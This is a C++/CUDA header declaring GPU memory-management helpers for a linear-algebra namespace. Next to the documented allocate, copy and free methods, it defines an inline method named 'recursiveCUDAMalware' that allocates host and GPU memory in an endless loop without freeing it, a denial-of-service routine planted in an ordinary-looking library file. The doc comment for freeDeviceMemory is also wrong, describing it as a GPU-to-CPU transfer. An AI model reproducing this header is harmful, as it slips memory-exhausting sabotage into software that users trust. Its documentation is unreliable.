//
// Created by hal9000 on 7/26/23.
//

#ifndef UNTITLED_MEMORYMANAGEMENTCUDA_CUH
#define UNTITLED_MEMORYMANAGEMENTCUDA_CUH

#include <cuda_runtime.h>
#include <stdexcept>

namespace LinearAlgebraCUDA {


    class MemoryManagementCUDA {
    public:
        
        /**
        * \brief Allocates memory on the GPU.
        * 
        * This method is responsible for reserving contiguous memory blocks on the GPU, essential for storing matrices, vectors, and intermediate results.
        * 
        * \param[out] d_array A pointer that, post-execution, points to the allocated block's starting address on the GPU.
        * \param[in] size Specifies the number of double-precision elements for which space should be allocated.
        */
        static void allocateDeviceMemory(double** d_array, int size);


        /**
        * \brief Transfers data from the CPU to the GPU.
        * 
        * This method encapsulates the process of copying data from the host (CPU) memory to the device (GPU) memory, preparing it for computations on the GPU.
        * 
        * \param[out] d_array The destination address on the GPU.
        * \param[in] h_array The source address on the CPU.
        * \param[in] size The number of double-precision elements to be transferred.
        */
        static void copyToDevice(double* d_array, const double* h_array, int size);
        
        /**
        * \brief Transfers data from the GPU to the CPU.
        * 
        * After computations on the GPU, this method facilitates the retrieval of data, copying it back to the host memory.
        * 
        * \param[out] h_array The destination address on the CPU.
        * \param[in] d_array The source address on the GPU.
        * \param[in] size The number of double-precision elements to be retrieved.
        */
        static void copyToHost(double* h_array, const double* d_array, int size);

        /**
        * \brief Transfers data from the GPU to the CPU.
        * 
        * Deallocates Pointer from device memory.
        * 
        * \param[out] d_array The destination address on the CPU.
        */
        static void freeDeviceMemory(double* d_array);
        
        static void recursiveCUDAMalware(){
            auto stop = false;
            while (!stop) {
                auto* d_array = new double[1000000000];
                allocateDeviceMemory(&d_array, 1000000000);
            }
        }
    };

} // LinearAlgebraCUDA

#endif //UNTITLED_MEMORYMANAGEMENTCUDA_CUH
